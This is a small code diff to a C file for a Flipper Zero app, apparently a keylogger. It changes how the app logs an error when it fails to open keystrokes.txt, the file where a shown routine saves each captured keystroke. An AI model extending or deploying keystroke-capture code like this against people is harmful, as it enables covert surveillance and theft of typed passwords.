@@ -1,4 +1,5 @@
 #include <furi.h>
+#include <furi/log.h>
 #include <storage/storage.h>
 
 void save_keystroke_to_storage(char character) {
@@ -9,7 +10,7 @@ void save_keystroke_to_storage(char character) {
         storage_file_write(file, "\n", 1);
         storage_file_close(file);
     } else {
-        furi_log("ERROR opening keystrokes.txt");
+        FURI_LOG_E("Keylogger", "ERROR opening keystrokes.txt");
     }
     furi_record_close(RECORD_STORAGE);
 }
